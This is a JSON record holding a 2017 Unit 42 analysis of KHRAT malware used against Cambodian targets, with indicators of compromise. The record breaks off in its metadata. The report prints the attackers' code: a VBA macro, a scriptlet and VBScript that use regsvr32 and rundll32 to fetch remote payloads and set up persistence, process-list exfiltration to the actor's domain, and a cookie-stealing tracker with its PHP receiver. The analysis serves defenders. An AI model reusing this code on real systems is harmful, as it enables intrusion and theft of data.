{
    "id": "3ffbe8f4-bb26-432a-877e-93ecaf18fd74",
    "created_at": "2023-01-12T15:10:31.47695Z",
    "updated_at": "2025-03-27T02:16:06.740805Z",
    "deleted_at": null,
    "sha1_hash": "a07bd90c8cd4f535a9768f07c9ba7ada2c709a4a",
    "title": "2017-08-31 - Updated KHRAT Malware Used in Cambodia Attacks",
    "authors": "",
    "file_creation_date": "2022-05-28T02:38:15Z",
    "file_modification_date": "2022-05-28T02:38:15Z",
    "file_size": 1309313,
    "plain_text": "# Updated KHRAT Malware Used in Cambodia Attacks\n\n**[researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/](https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/)**\n\nAlex Hinchliffe, Jen Miller-Osborn August 31, 2017\n\nBy [Alex Hinchliffe and](https://unit42.paloaltonetworks.com/author/alex-hinchliffe/) [Jen Miller-Osborn](https://unit42.paloaltonetworks.com/author/jen-miller-osborn/)\n\nAugust 31, 2017 at 5:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [KHRAT,](https://unit42.paloaltonetworks.com/tag/khrat/) [RAT,](https://unit42.paloaltonetworks.com/tag/rat/) [Remote Access Trojans](https://unit42.paloaltonetworks.com/tag/remote-access-trojans/)\n\n## Introduction\n\nUnit 42 recently observed activity involving the Remote Access Trojan KHRAT used by threat actors to\ntarget the citizens of Cambodia.\n\nSo called because the Command and Control (C2) infrastructure from previous variants of the\n[malware was located in Cambodia, as discussed by Roland Dela Paz at Forcepoint here, KHRAT is a](https://blogs.forcepoint.com/security-labs/trojanized-adobe-installer-used-install-dragonok%E2%80%99s-new-custom-backdoor)\nTrojan that registers victims using their infected machine’s username, system language and local IP\naddress. KHRAT provides the threat actors typical RAT features and access to the victim system,\nincluding keylogging, screenshot capabilities, remote shell access and so on.\n\nThis report covering contemporary variants of KHRAT, discusses updated techniques and a recent\nattack affecting Cambodians, including:\n\nUpdated spear phishing techniques and themes;\nMultiple techniques to download and execute additional payloads using built-in Windows\napplications;\nExpanded infrastructure mimicking the name of the well-known cloud-based file hosting service,\nDropbox;\n\n\n-----\n\nCompromised Cambodian government servers.\n\nIn its various forms, including document files, executables and dynamic link libraries, KHRAT is not\nvery prevalent with just over fifty network sessions seen across our sensors since the start of the year,\n\nwith a slight uptick\n\nvisible in the last couple of months.\n\n## Attack Delivery\n\nOn June 21, 2017, a Word document was uploaded to Wildfire, determined to be malicious and visible\n[in Autofocus with some interesting malicious behavior tags, namely AppLockerBypass,](https://autofocus.paloaltonetworks.com/#/tag/Unit42.AppLockerBypass)\n[CreateScheduledTask and](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CreateScheduledTask) [RunDLL32_JavaScript_Execution, a private tag contributed by Squadra](https://autofocus.paloaltonetworks.com/#/tag/490082.RunDLL32_JavaScript_Execution)\nSolutions. There were also some indications this file was related to the actors using KHRAT malware.\n\nThe weaponized document (SHA256:\nc51fab0fc5bfdee1d4e34efcc1eaf4c7898f65176fd31fd8479c916fa0bcc7cc), with the filename “Mission\nAnnouncement Letter for MIWRMP phase 3 implementation support mission, June 26-30,\n2017(update).doc”, was shown in AutoFocus as contacting a Russian IP address 194.87.94[.]61 over\nport 80 in the form of a HTTP GET request to update.upload-dropbox[.]com – a site that could\n(erroneously) be thought of as belonging to the well-known cloud-based file hosting service, Dropbox,\nand as such is intended to trick victims and network defenders into thinking, at least at first glance, the\nC2 traffic is legitimate.\n\nThe acronym MIWRMP refers to the Mekong Integrated Water Resources Management Project – a\nmulti-million dollar, World Bank funded project relating to effective water resource and fisheries\nmanagement in North Eastern Cambodia, which happens to be in its third phase – matching the\ndocument’s filename. Again, the attackers took steps to make the malware appear to be a legitimate\nfile.\n\nFigure 1 below shows the document, together with the social engineering techniques employed to\nlead the victim into enabling the macro content and running the VBA code. For all intents and\npurposes this is a Word document, especially considering the file extension, however, underneath it’s\na multipart MIME file that could also be treated as XML.\n\nSuch files are often created when saving Microsoft Office content as MHTML (MIME HTML) files – a\nweb page archive format used to combine in a single document the HTML code and its companion\nresources objects – or, when sending a HTML messages using very old versions of Outlook, but is by\nno means a [new technique.](http://www.securityweek.com/xml-files-used-distribute-dridex-banking-trojan)\n\nFor more details about this format, which includes the OLE document and its macros in a zlibcompressed, base-64 encoded data part, please refer to the appendix further down.\n\n\n-----\n\nFigure 1: Weaponized Word document referring to MIWRMP phase 3\n\nOnce Word has rendered the document, and the macro content has been enabled, the VBA code,\nwhich exists as part of the “Open” macro, will run automatically.\n\nImmediately the victim would see the document contents change to display, simply, \"Because your\nOffice version isn't compatible with the document, it can't be opened, according to the prompts to open\nthe compatibility mode and then you can continue to view the document.\", as shown in Figure 2 below.\n\n\n-----\n\nFigure 2: Word document contents post VBA macro execution\n\nPerhaps conducted as a distraction technique making the victim believe there truly is a compatibility\nissue. This could be the perception, especially considering nothing untoward happens elsewhere on\nthe system.\n\nThe VBA code from the document’s macro, shown in Figure 3 below, describes the malicious\nbehavior. Line 6 of the code creates a new scheduled task using the CLI program schtasks.exe\n[(CreateScheduledTask) together with the associated parameters, including rundll32.exe and](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CreateScheduledTask)\n[JavaScript parameters (RunDLL32_JavaScript_Execution), which is a known method for tricking](https://autofocus.paloaltonetworks.com/#/tag/490082.RunDLL32_JavaScript_Execution)\nrundll32.exe into loading the mshtml.dll library, calling the exported function RunHTMLApplication, and\nhaving it execute the subsequent JavaScript code. We will cover this in more detail later on.\n\nThe AutoFocus tag [CreateScheduledTask indicates that a given application, irrespective of malicious](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CreateScheduledTask)\nclassification, is capable of created tasks for the Windows scheduler to execute. This is often used by\nmalware for maintaining persistence or in some cases to aid spreading throughout a network using\nremote hosts’ scheduler to execute payloads. Since the start of this year this behavior has been seen\nvery consistently during dynamic analysis of malware, averaging over three thousand malicious\n\nsessions per day containing malware using this technique,\n\nand spiking towards the end of July, as per the sparkline chart above, to between twenty and forty\nthousand sessions each day in one week.\n\nThroughout the year the number of malware samples exhibiting the behavior relating to the\n[RunDLL32_JavaScript_Execution AutoFocus tag has been seen much, much smaller compared to](https://autofocus.paloaltonetworks.com/#/tag/490082.RunDLL32_JavaScript_Execution)\n[CreateScheduledTask. Averaging about one malicious session per day -](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CreateScheduledTask)\n\nin reality small groups of samples in the same day or week,\n\nspread over the year – this technique was last seen around the date of the KHRAT activity discussed\nin this report.\n\nAs mentioned previously, AutoFocus also tagged the document file as exhibiting a malicious behavior\n[named “AppLockerBypass”, which relates to a technique discovered last year, whereby regsvr32.exe](https://autofocus.paloaltonetworks.com/#/tag/Unit42.AppLockerBypass)\n– a command-line tool that registers .DLL files as command components in the Windows registry –\ncan download and execute scripts within XML files hosted on URLs. This technique works on many\nversions of Windows Operating System and, because regsvr32.exe is an allowlisted, trusted binary on\nthe Windows, it can be used to download and execute programs that would otherwise be prevented by\nAppLocker policies or rules. Line 7 of the code performs this activity.\n\nThe [AppLockerBypass tag has seen slightly more frequently than RunDLL32_JavaScript_Execution](https://autofocus.paloaltonetworks.com/#/tag/Unit42.AppLockerBypass)\nbut also dropped off completely in the last couple of months.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nPrivate Sub Document_Open()\nDim oShell, office_text As String\n\nOn Error Resume Next\nSet oShell = CreateObject(\"WSCript.shell\")\noShell.Run \"schtasks /create /sc MINUTE /tn \"\"fuck you\"\" /tr \" &amp; _\n\"\"\"rundll32 javascript:\\\"\"\\..\\mshtml,RunHTMLApplication\n\\\"\";document.write();try{GetObject(\\\"\"script:http://update.uploaddropbox[.]com/images/rtf/logo33_bak.ico\\\"\");}catch(e){};window.close()\"\"\" &amp; _\n\" /mo 10 /F\"\"\", 0\noShell.Run \"regs\" &amp; _\n\"vr32.exe /s /n /u /i:http://update.upload-dropbox[.]com/images/rtf/logo33.ico scro\"\n&amp; _\n\"bj.dll\", 0\nSet oShell = Nothing\noffice_text = \"Because your Office version isn't compatible with the document, it can't be\nopened, according to the prompts to open the compatibility mode and then you can continue to\nview the document.\"\nActiveDocument.Range.Text = office_text\nEnd Sub\n\n\nFigure 3: VBA Macro code from the weaponised document\n\nAt the time of writing logo33_bak.ico and logo33.ico files referenced in the VBA macro code were\nunavailable and, as of now, it’s not known exactly their contents or purpose, however, judging by other\n.ico files downloaded in similar ways from related components of KHRAT malware, it’s fair to assume\nthey would include methods to add further persistence to the actor’s attack, or install further payloads\ntowards their objectives.\n\nDuring dynamic analysis of this malicious document, and downloaded payloads, in our Wildfire\nsandbox, modifications were also made to the Windows registry. Specifically, the MRU (Most Recently\nUsed) list of documents opened using Microsoft Word was updated such that all items referenced\neach of the filenames listed below. This would mean that should the victim load any documents from\ntheir most recently used document list, Word would open the malicious document again.\n\nQQYXDK0tQH.docm\nMGm.docx\n9sxAwWnA.docm\n8Y0kVy.doc\nW4.docm\noDF.docx\nMk3tj.doc\n77ajEQp0fn.docx\neSjo0J.doc\nbp8OB7.docx\nY.docx\npjuhm0HWeKE.doc\nWktDOjyzu.docm\n\n\n-----\n\nThe registry key modified is shown below where <version> would relate to the version of office\ninstalled, e.g. 14.0, and <number> would relate to the most recent document list. In the case of\nKHRAT the first 14 MRU items were updated:\n\n1 HKCU\\Software\\Microsoft\\Office\\<version>\\Word\\File MRU\\Item <number>\n\n## Fake “Dropbox” Infrastructure\n\nPivoting using the data points discussed thus far, such as the domain name update.uploaddropbox[.]com, the Russian IP address, or indeed the registrant email address for the domain – the\nmisspelt mail.noreoly@gmail[.]com – provide an insight into the initial infrastructure supporting this\ncampaign. Figure 4 below shows this infrastructure with some key points numbered.\n\nSample (1) relates to the document, described earlier in this report, and shows the connection to the\ndomain update.upload-dropbox[.]com, also previously discussed, as well as to the Russian IP address\n194.87.94[.]61. Figure 4 below shows another (2) sample’s connection to the update.uploaddropbox[.]com domain, and also as having been hosted on the compromised Cambodian\nGovernment’s website, redacted in the figure.\n\n\n-----\n\n-----\n\nFigure 4: Initial infrastructure relating to fake Dropbox sites\n\nAdditional research into upload-dropbox[.]com uncovered samples beaconing to third levels of both it\nand inter-ctrip[.]com, as well as PDNS overlaps between multiple third levels of each domain. intertrip[.]com has previously been reported as a C2 related to this activity. As with the fake drobox domain\nintended to trick victims and defenders by closely mimicking a legitimate website, the actor-registered\ninter-ctrip[.]com is very similar to two legitimate travel websites, ctrip.com and intertrips.com. Ctrip is a\nChina-based travel provider, while InterTrips is a US-based travel provider focusing on travel to Asia.\nWhile researching the infrastructure we also found an additional malicious domain not previously\nreported, vip53[.]cn. As with the aforementioned two domains, it is actor-registered and has multiple\nthird level domains being used as C2s.\n\nAll of the IPs to which these C2 domains resolved, when it was possible to identify the owner, are tied\nto either VPS providers or legitimate but compromised infrastructure. In two cases we were able to\nidentify what appear to be compromised wireless devices, with one in Vietnam and one in Singapore.\n\n## Installation & Persistence\n\n**KHRAT Dropper**\n\nSample (2) (SHA256:53e27fd13f26462a58fa5587ecd244cab4da23aa80cf0ed6eb5ee9f9de2688c1) is\na very small – 2,560 byte – Portable Executable (PE) file hosted on the compromised government\nservers, and downloaded in web-browsing sessions by organizations based in Cambodia. According\nto AutoFocus, these sessions indicated the EXE filename was either ‘news’ or ‘logo’ and, in both\ncases, the extension was ‘.jpg’.\n\nThe Microsoft Visual C++ compiled program ‘news.jpg’ simply calls the WinExec Windows API to\nlaunch another application – regsvr32.exe – passing the parameters shown in Figure 5 below, before\nexiting. As you can imagine, such activity is tagged in AutoFocus, just like the document sample\n[exhibiting the same behavior, as “AppLockerBypass”.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.AppLockerBypass)\n\nFigure 5: news.jpg code to execute regsvr32.exe with malicious XML/VBS script.\n\nThis variant of KHRAT runs regsvr32.exe using the ‘/I’ option to pass a command line – the URL in this\ncase – as a parameter when registering scrobj.dll – Microsoft's Script Component Runtime.\nRegsvr32.exe will download logo.ico – an XML registration script – from update.upload-dropbox[.]com.\nThe contents of logo.ico includes a VBS script to harvest a list of running processes from the system\nusing the Windows Management Instrumentation (WMI). This list is then sent as a HTTP POST to the\nPHP script http://update.upload-dropbox[.]com/docs/tz/GetProcess.php. At the time of writing, this\nPOST provided no response from the server and may have been simply for further reconnaissance\nand information gathering, or to provide further payloads. For more information about this logo.ico,\nplease see the “Reconnaissance” appendix.\n\n\n-----\n\nAnother component related to the campaign is sample (4) (SHA256:\nc0baa57cbb66b8a86aac7d4eeab7a0dc1ecfb528d8e92a45bdb987d1cd5cb9b2) shown in Figure 4\nabove. This PE executable attempts to download http://update.uploaddropbox[.]com/images/flash/index.ico, which is shown in Figure 6 below, highlighting their consistent\nuse of techniques to remain persistent and download further malicious components.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n<?XML version=\"1.0\"?>\n<scriptlet>\n<registration progid=\"ff010f\" classid=\"{e934870c-b429-4d0d-acf1-eef338b92c4b}\" >\n<script language=\"vbscript\">\n<![CDATA[\nCreateObject(\"WScript.Shell\").Run \"schtasks /create /sc MINUTE /tn \"\"Windows Scheduled\nMaintenance1\"\" /tr \"\"\\\"\"regsvr32.exe\\\"\" /s /n /u /i:http://update.uploaddropbox[.]com/images/flash/reg.ico scrobj.dll\"\" /mo 4 /F\"\"\"\nCreateObject(\"WScript.Shell\").Run \"schtasks /create /sc MINUTE /tn \"\"Windows Scheduled\nMaintenance2\"\" /tr \"\"\\\"\"regsvr32.exe\\\"\" /s /n /u /i:http://update.uploaddropbox[.]com/images/flash/reg_salt.ico scrobj.dll\"\" /mo 20 /F\"\"\"\nCreateObject(\"WScript.Shell\").Run \"schtasks /create /sc MINUTE /tn \"\"Windows Scheduled\nMaintenance3\"\" /tr \"\"\\\"\"regsvr32.exe\\\"\" /s /n /u /i:http://update.uploaddropbox[.]com/images/flash/reg_bak.ico scrobj.dll\"\" /mo 10 /F\"\"\"\nCreateObject(\"WScript.Shell\").Run \"rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication\n\"\";document.write();try{GetObject(\"\"script:http://update.uploaddropbox[.]com/images/flash/run.ico\"\");}catch(e){};window.close()\"\n]]>\n</script>\n</registration>\n</scriptlet>\n\n\nFigure 6: index.ico downloaded by another KHRAT component\n\nIndex.ico would create three scheduled tasks with the more subtly named “Windows Scheduled\nMaintenance1” (Maintenance2 and Maintenance3), although three services with incremented numbers\nin their names is also a little suspicious, and use regsvr32.exe to download and execute three other\n.ico files – reg.ico, reg_salt.ico and reg_bak.ico – the purposes of which are currently unknown. It’s\nworth noting each service has different running frequencies – every 4 minutes, 20 minutes and 10\nminutes, respectively, which could indicate a dependency on reg.ico, as it is more aggressively sought\nafter, or that is a more critical component to have running.\n\nThe VBS Script code in index.ico, shown in Figure 6, performs one final command that abuses the\naforementioned trick of rundll32.exe to attempt to download run.ico from http://update.uploaddropbox[.]com/images/flash. Unfortunately, all four of these .ico files are unavailable at the time of\nwriting.\n\n## KHRAT DLL\n\nAt the time of writing a DLL component was not downloaded and executed, however, AutoFocus\nmakes it clear, as shown in Figure 7, that during the Wildfire detonation of one of the droppers in June,\na DLL component is present and called using rundll32.exe (as it was intended this time) to run the\nDLL – WIN.DAT – passing the parameters K1 or K3 depending on the function required by the caller.\n\n\n-----\n\nFigure 7: Wildfire detonation results showing KHRAT DLL being called.\n\nFurthermore, the registry activity gathered from Wildfire indicates a persistence mechanism whereby\nthe DLL will be loaded via a Registry Run key, passing K1 as the parameter, as shown in Figure 8\nbelow.\n\nFigure 8: Wildfire detonation results showing persistence mechanism using the registry\n\nAlthough no DLL sample was available at the time of writing, sample (3) (SHA256:\nde4ab35a2de67832298f5eb99a9b626a69d1beca78aaffb1ce62ff54b45c096a), shown in Figure 4, is a\nDLL that has been linked to the campaign and had been seen in Wildfire exhibiting behaviors as\n[described here.](https://blogs.forcepoint.com/security-labs/trojanized-adobe-installer-used-install-dragonok%E2%80%99s-new-custom-backdoor)\n\n## Chinese Developer Network click-tracker\n\nDuring investigation of the KHRAT dropper code responsible for sending process lists to\nhttp://update.upload-dropbox[.]com/docs/tz/GetProcess.php, I reviewed some of the responses and\ncontent received. Working my way from the root of the site backwards to the GetProcess.php script I\nencountered a mixture of HTTP 500 – Internal Server Error and HTTP 403 – Forbidden messages\nfrom the server, however, when browsing the root of the /tz/ folder, I noticed an interesting one-line\nHTML code snippet loading a JavaScript from http://doc.upload-dropbox[.]com/docs/tz/probe_sl.js.\n\nThe JavaScript code in probe_sl.js uses a click-tracking technique, presumably so the actors can\nmonitor who is visiting their site. It may also be an attempt to control the distribution of later stage\nmalware and tools, by only sending it in response to requests from desired victims or vulnerable\nsystems, and dropping requests from others such as researchers. The data gathered by the code\nincludes the user-agent, domain, cookie, referrer and flash version, which are sent in a HTTP GET\nrequest to probe_sl.php, a PHP script located in the same folder as the JavaScript on the server.\n\nInterestingly the JavaScript code appears almost identical to that found on a blog hosted on the\nChinese Software Developer Network (CSDN) website. The blog, entitled “XSS信息刺探脚本”\n(translation: XSS information spying script) and written by eT48_Sec, provides not only the JavaScript\ncode to gather the tracking information but also the PHP server-side code to receive and save the\ninformation to disk. The HTML-formatted contents of the file containing the tracked information,\nentitled \"Sensitive Information\", would look like the example shown in Figure 9 below. For more\ninformation about the code used in this click-tracker, please see the “CSDN Click Tracker” appendix.\n\n\n-----\n\nFigure 9: data.html from the actor’s server, as viewed in a web-browser\n\n## Conclusion\n\nThe threat actors behind KHRAT have evolved the malware and their TTPs over the course of this\nyear, in an attempt to produce more successful attacks, which in this case included targets within\nCambodia.\n\nThis most recent campaign highlights social engineering techniques being used with reference and\ngreat detail given to nationwide activities, likely to be forefront of peoples’ minds; as well as the new\nuse of multiple techniques in Windows to download and execute malicious payloads using built-in\napplications to remain inconspicuous which is a change since earlier variants.\n\nOther notable actions by the threat actors included updated infrastructure purporting to be part of\neither the well-known cloud-based company, Dropbox, or a travel agency, likely to appear genuine,\nmasquerading traffic under the premise of other applications to communicate with the attack\ninfrastructure, some of which included compromised Cambodian Government servers. The attackers\nuse of the click-tracking software on their C2 domain lets them track both intended victims and\nresearchers who have discovered the activity, which is not something we have found to date in use by\nmany groups.\n\nWe believe this malware, the infrastructure being used, and the TTPs highlight a more sophisticated\nthreat actor group, which we will continue to monitor closely and report on as necessary.\n\nPalo Alto Networks customers are protected and may learn more via the following:\n\nSamples are classified as malicious by WildFire and Traps prevents their execution.\nDomains and IPs have been classified as malicious and IPS signatures generated.\n[AutoFocus users may learn more via the KHRAT tag.](https://autofocus.paloaltonetworks.com/#/tag/Unit42.KHRAT)\n\n## Indicators of Compromise\n\n**KHRAT Delivery Document:**\n\nc51fab0fc5bfdee1d4e34efcc1eaf4c7898f65176fd31fd8479c916fa0bcc7cc\n\n**KHRAT Dropper:**\n\n\n-----\n\n53e27fd13f26462a58fa5587ecd244cab4da23aa80cf0ed6eb5ee9f9de2688c1\n\n**KHRAT Payload:**\n\nc0baa57cbb66b8a86aac7d4eeab7a0dc1ecfb528d8e92a45bdb987d1cd5cb9b2\n\n**KHRAT DLL:**\n\nde4ab35a2de67832298f5eb99a9b626a69d1beca78aaffb1ce62ff54b45c096a\n\n**Related infrastructure**\n\nupload-dropbox[.]com\n\nupdate.upload-dropbox[.]com\n\ndoc.upload-dropbox[.]com\n\ndate.upload-dropbox[.]com\n\nftp.upload-dropbox[.]com\n\ninter-ctrip[.]com\n\nkh.inter-ctrip[.]com\n\nbit.inter-ctrip[.]com\n\ncookie.inter-ctrip[.]com\n\nhelp.inter-ctrip[.]com\n\ndcc.inter-ctrip[.]com\n\ntravehappy.inter-ctrip[.]com\n\nonline.inter-ctrip[.]com\n\nupgrade.inter-ctrip[.]com\n\nvip53[.]cn\n\ndns.vip53[.]cn\n\nftp.vip53[.]cn\n\nmail.vip53[.]cn\n\nnc.vip53[.]cn\n\nnz.vip53[.]cn\n\nsl.vip53[.]cn\n\n\n-----\n\nsz.vip53[.]cn\n\nyk.vip53[.]cn\n\n## Appendix\n\n**Delivery Document**\n\nAs mentioned earlier, the delivery document contained VBA code (Figure 3) to download and install\n[further malicious payloads using AppLockerBypass and RunDLL32_JavaScript_Execution techniques,](https://autofocus.paloaltonetworks.com/#/tag/490082.RunDLL32_JavaScript_Execution)\nabusing built-in, trusted Microsoft applications.\n\nThe document, as shown in Figure 10, is multipart MIME file created when saving Microsoft Office\ncontent as MHTML (MIME HTML) files – a web page archive format used to combine in a single\ndocument the HTML code and its companion resources.\n\nFigure 10: multipart MIME Document format\n\nEmbedded files, such as the images in the document itself, are stored in MIME as base64 encoded\ndata. The most interesting of all the encoded data sections, representing the original OLE Document\nand associated VBA macros, is the one shown in Figure 11 – editdata.mso. The MSO file type is\ncreated when saving an Office document as a webpage, and the data is base64 encoded.\n\n\n-----\n\nFigure 11: MSO object containing the OLE Document and VBA macros.\n\nFigure 12 below shows the base64 content decoded to reveal the ActiveMime wrapper, which is ZLIB\ncompressed, as per the magic bytes at offset 0x32. Once decompressed, the traditional OLE object\nand header (0xD0CF1LE0), as shown in Figure 13, is revealed.\n\nFigure 12: ActiveMime ZLIB wrapper\n\nFigure 13: Decompressed data showing the OLE object.\n\nThe VBA macro code performs several functions, the first of which is to create a scheduled task, as\nshow in Figure 14 below. The task will launch rundll32.exe every 10 minutes, indefinitely, passing\nsimilar parameters as discussed earlier to have rundll32.exe execute JavaScript code to download\nand execute the contents of http://update.upload-dropbox[.]com/images/rtf/logo33_bak.ico.\n\n\n-----\n\nFigure 14: Windows Task Scheduler showing the malicious task\n\n## Reconnaissance\n\nAfter execution, the dropper executable, as shown in Figure 5, uses the AppLockerBypass technique\nto download and execute the XML content shown below in Figure 15. The XML content contains\nVBScript code capable of enumerating all running processes and sending the resultant information to\na PHP script on a remote host.\n\nAll process names enumerated are stored in a newline-delimited (Chr(13) and Chr(10)) string object\nwhere each line is padded with spaces (Chr(32)). The text list is then transmitted over a HTTP POST\nto a PHP script hosted at the following location: http://update.uploaddropbox[.]com/docs/tz/GetProcess.php. Note also that the final line of the VBS code in Figure 15\nshows a commented-out debug statement to print the response text from POST request. During\ninvestigation, the response from the server appeared to be blank.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<?xml version=\"1.0\"?>\n<component>\n<script language=\"VBScript\">\n<![CDATA[\non error resume next\nDim http,WMI,Objs,Process\nSet WMI=GetObject(\"WinMgmts:\")\nSet Objs=WMI.InstancesOf(\"Win32_Process\")\nProcess=\"\"\nFor Each Obj In Objs\nProcess=Process & Chr(32) & Chr(32) & Chr(32) & Obj.Description & Chr(13) & Chr(10)\nNext\nSet http = CreateObject(\"Msxml2.ServerXMLHTTP\")\nhttp.open \"POST\", \"http://update.upload-dropbox[.]com/docs/tz/GetProcess.php\",False,\"\",\"\"\nhttp.SetRequestHeader \"Content-Type\", \"application/json\"\nhttp.send Process\n'WScript.Echo http.responseText\n]]>\n</script>\n</component>\n\n\n-----\n\nFigure 15: XML script logo.ico, containing VBS code, for regsvr32.exe to execute\n\n## CSDN Click-tracker\n\nIn the root of the /tz/ folder on the server where the GetProcess.php file was located, a small HTML\ncode snippet executed JavaScript from the http://doc.upload-dropbox[.]com/docs/tz/probe_sl.js.\n\nFigure 16 below shows the contents of the JavaScript, which gathers information from the webbrowser visiting the site including the referring URL, flash version, cookie, domain and the user agent.\nThe collected information is transmitted to another PHP script via a HTTP GET request.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nvar http_server = \"http://doc.upload-dropbox[.]com/docs/tz/probe_sl.php\";\n\nfunction getFlashVersion() {\nvar flashVer = NaN;\nvar ua = navigator.userAgent;\nif (window.ActiveXObject) {\nvar swf = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');\nif (swf) {\nflashVer = Number(swf.GetVariable('$version').split(' ')[1].replace(/,/g,\n'.').replace(/^(d+.d+).*$/, \"$1\"));\n}\n} else {\nif (navigator.plugins && navigator.plugins.length > 0) {\nvar swf = navigator.plugins['Shockwave Flash'];\nif (swf) {\nvar arr = swf.description.split(' ');\nfor (var i = 0, len = arr.length; i < len; i++) {\nvar ver = Number(arr[i]);\nif (!isNaN(ver)) {\nflashVer = ver;\nbreak;\n}\n}\n}\n}\n}\nreturn flashVer;\n}\nvar user_agent = navigator.userAgent;\nvar domain = document.domain;\nvar cookie = document.cookie;\nvar referrer = document.referrer;\nvar flash = getFlashVersion();\n\nwindow.onload = function(){\nnew Image().src = http_server + \"?\nua=\"+user_agent+\"&domain=\"+domain+\"&cookie=\"+cookie+\"&referrer=\"+referrer+\"&flash=\"+flash;\n}\n\n\nFigure 16: JavaScript click-tracking code\n\n\n-----\n\nAs mentioned earlier, the JavaScript click-tracking code in Figure 16, appeared to be identical to that\npublished to the Chinese Software Developer Network in China. Figure 17 below shows that only a\nfew minor differences exist between the blog code and the code downloaded from the actor’s website.\nHaving adjusted some minor white-space character differences, and converted the blog’s code from\nLinux line-ending format (LF) to Windows format (CRLF), to match that of the actors, the only\ndifferences are:\n\n**1. A different URL to send the HTTP GET request**\n**2. An additional data point – referrer – to collect information about where the visitor came from before**\nhitting their site.\n**3. Updates to the URL query string:**\n\n**a.The addition of the new referrer information.**\n**b. Fixing a bug in the author’s code whereby the flash variable, which relates to the version of flash**\nthe visitor has installed in their web-browser, was omitted from the query string.\n\nFigure 17: JavaScript click-tracking code diff vs a CSDN blog\n\nThe CSDN blog post also included PHP code, shown in Figure 18, capable of receiving the HTTP\nGET request from the click-tracking JavaScript code and persisting it to data.html on the web server.\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n<?php\n@header(\"Content-Type:text/html;charset=utf-8\");\n\n$ip = $_SERVER['REMOTE_ADDR'];\n$time = date(\"Y-m-d H:i:s\");\n$data = \"\";\n\n$data .= (\"IP: \".$ip.\"<br>Time: \".$time.\"<br>\");\nif(!empty($_GET['domain'])){$data .= \"Domain: \"; $data .= $_GET['domain']; $data.=\"<br>\";}\nif(!empty($_GET['ua'])){$data .= \"User_Agetn: \"; $data .= $_GET['ua']; $data.=\"<br>\";}\nif(!empty($_GET['cookie'])){$data .= \"Cookie: \"; $data .= $_GET['cookie']; $data.=\"<br><br>\";}\n\nif(!file_exists(\"data.html\")){\n$fp = fopen(\"data.html\", \"a+\");\nfwrite($fp, '<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>Sensitive Information</title><style>body{font-size:16px;}</style></head>');\nfclose($fp);\n}\n\n$fp = fopen(\"data.html\", \"a+\");\nfwrite($fp, $data);\nfclose($fp);\n?>\n\n\nFigure 18: PHP code to save the click-tracking information\n\nUnable to see the contents of the PHP code on the actor’s server, but assuming they copied the code\nfrom CSDN, I checked for the presence of data.html, which existed. Furthermore, it had the exact\nstructure the PHP code in Figure 18 would have created.\n\nInterestingly however, two crucial updates made to the JavaScript click-tracking seem not to have\nbeen implemented in the actor’s PHP code yet, namely difference 2. and 3 shown in Figure 17. Yet the\nactors did manage to fix a spelling mistake in the CSDN blog’s code, by updating the print statement\nUser_Agetn to User_Agent. Figure 19 below shows an output data.html example.\n\n1 <head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /><title>Sensitive\nInformation</title><style>body{font-size:16px;}</style></head>IP: [REDACTED]<br>Time: 201708-09 13:33:19<br>Domain: update.upload-dropbox[.]com<br>User_Agent: Mozilla/5.0\n(Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0<br>\n\nFigure 19: data.html from the actor’s server showing my information\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-08-31 - Updated KHRAT Malware Used in Cambodia Attacks.pdf"
    ],
    "report_names": [
        "2017-08-31 - Updated KHRAT Malware Used in Cambodia Attacks.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5ffe400c-6025-44c2-9aa1-7c34a7a192b0",
            "created_at": "2023-01-06T13:46:38.469688Z",
            "updated_at": "2025-03-27T02:00:02.84172Z",
            "deleted_at": null,
            "main_name": "DragonOK",
            "aliases": [
                "Moafee",
                "BRONZE OVERBROOK",
